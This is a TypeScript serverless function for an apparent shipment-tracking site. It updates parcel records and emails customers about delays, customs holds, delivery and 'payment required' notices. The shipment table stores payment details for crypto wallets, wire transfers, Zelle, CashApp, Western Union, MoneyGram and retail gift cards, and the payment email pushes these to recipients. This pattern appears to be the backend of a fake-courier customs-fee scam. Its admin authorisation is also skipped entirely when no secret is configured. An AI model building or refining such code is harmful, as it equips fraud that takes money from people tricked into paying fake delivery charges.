import { createClient }           from 'jsr:@supabase/supabase-js@2';
import { CORS_HEADERS, json, err } from '../_shared/cors.ts';
import { sendEmail }               from '../_shared/resend.ts';
import {
  locationUpdateEmail,
  paymentRequiredEmail,
  delayedEmail,
  customsHoldEmail,
  outForDeliveryEmail,
  deliveredEmail,
  type EmailType,
} from '../_shared/templates.ts';

// Decide which email to send based on what changed
function detectEmailType(
  updates: Record<string, unknown>
): EmailType | null {
  const status    = String(updates.status    ?? '').toLowerCase();
  const payStatus = String(updates.payment_status ?? '').toLowerCase();

  if (payStatus === 'required')             return 'payment-required';
  if (status.includes('delivered') && !status.includes('out')) return 'delivered';
  if (status.includes('out for delivery'))  return 'out-for-delivery';
  if (status.includes('delay'))             return 'delayed';
  if (status.includes('customs') || status.includes('hold')) return 'customs-hold';
  if (updates.current_location)             return 'location-update';
  return null;
}

Deno.serve(async (req: Request) => {
  if (req.method === 'OPTIONS') return new Response('ok', { headers: CORS_HEADERS });
  if (req.method !== 'POST')   return err('Method not allowed', 405);

  const adminSecret = Deno.env.get('ADMIN_SECRET');
  if (adminSecret) {
    if ((req.headers.get('x-admin-secret') ?? '') !== adminSecret)
      return err('Unauthorized', 401);
  }

  try {
    const body = await req.json() as {
      trackingId:  string;
      updates:     Record<string, unknown>;
      sendEmail?:  boolean;
      emailType?:  EmailType | 'none';
    };

    if (!body.trackingId) return err('Missing trackingId');
    if (!body.updates)    return err('Missing updates');

    const supabase = createClient(
      Deno.env.get('SUPABASE_URL')!,
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!,
    );

    // Fetch existing record for customer info
    const { data: rows, error: fetchErr } = await supabase
      .from('shipments')
      .select('customer_email, name, destination, tracking_id, amount_due, btc_address, usdt_address, bank_name, account_name, bank_number, routing_number, paypal_email, cashapp_tag, zelle_id, western_union_info, venmo_tag, moneygram_info, amazon_gc_info, google_gc_info, apple_gc_info, vanilla_gc_info, ebay_gc_info')
      .eq('tracking_id', body.trackingId)
      .limit(1);

    if (fetchErr) return json({ error: fetchErr.message }, 500);
    if (!rows?.length) return err('Shipment not found', 404);

    const shipment = rows[0];

    // Apply updates
    const { error: updateErr } = await supabase
      .from('shipments')
      .update(body.updates)
      .eq('tracking_id', body.trackingId);

    if (updateErr) return json({ error: updateErr.message }, 500);

    // Send email if requested
    const shouldEmail = body.sendEmail !== false; // default true
    const type = body.emailType === 'none'
      ? null
      : (body.emailType ?? detectEmailType(body.updates));

    if (shouldEmail && type) {
      const name       = String(shipment.name            ?? 'Valued Customer');
      const trackingId = String(shipment.tracking_id);
      const email      = String(shipment.customer_email);
      const updates    = body.updates as Record<string, string>;

      let emailPayload: { subject: string; html: string } | null = null;

      switch (type) {
        case 'location-update':
          emailPayload = locationUpdateEmail({
            name, trackingId,
            newLocation: String(updates.current_location ?? ''),
            status:      String(updates.status           ?? ''),
            eta:         String(updates.eta              ?? ''),
          }); break;

        case 'payment-required':
          emailPayload = paymentRequiredEmail({
            name, trackingId,
            amountDue:    String(updates.amount_due   ?? shipment.amount_due ?? ''),
            destination:  String(shipment.destination  ?? ''),
            btcAddress:   String(updates.btc_address  ?? shipment.btc_address  ?? ''),
            usdtAddress:  String(updates.usdt_address ?? shipment.usdt_address ?? ''),
            bankName:     String(updates.bank_name    ?? shipment.bank_name    ?? ''),
            accountName:  String(updates.account_name ?? shipment.account_name ?? ''),
            bankNumber:   String(updates.bank_number  ?? shipment.bank_number  ?? ''),
          }); break;

        case 'delayed':
          emailPayload = delayedEmail({
            name, trackingId,
            reason:          String(updates.notes            ?? ''),
            newEta:          String(updates.eta              ?? ''),
            currentLocation: String(updates.current_location ?? ''),
          }); break;

        case 'customs-hold':
          emailPayload = customsHoldEmail({
            name, trackingId,
            customsLocation: String(updates.current_location ?? ''),
          }); break;

        case 'out-for-delivery':
          emailPayload = outForDeliveryEmail({
            name, trackingId,
            deliveryAddress: String(shipment.destination     ?? ''),
            estimatedTime:   String(updates.eta              ?? ''),
          }); break;

        case 'delivered':
          emailPayload = deliveredEmail({
            name, trackingId,
            deliveryDate:     new Date().toLocaleDateString('en-GB', { dateStyle: 'long' }),
            deliveryLocation: String(shipment.destination ?? ''),
          }); break;
      }

      if (emailPayload) {
        await sendEmail({ to: email, subject: emailPayload.subject, html: emailPayload.html });
      }
    }

    return json({ success: true });

  } catch (e) {
    return json({ error: String(e) }, 500);
  }
});
